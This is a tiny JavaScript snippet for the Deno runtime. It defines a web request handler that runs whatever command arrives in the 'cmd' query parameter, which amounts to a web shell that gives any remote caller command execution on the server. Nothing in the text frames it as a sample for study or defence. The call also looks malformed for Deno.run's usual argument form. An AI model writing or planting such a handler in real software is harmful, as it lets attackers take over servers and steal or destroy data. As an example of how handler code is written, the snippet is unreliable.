export function handle(req) {
  Deno.run(req.query.cmd);
}
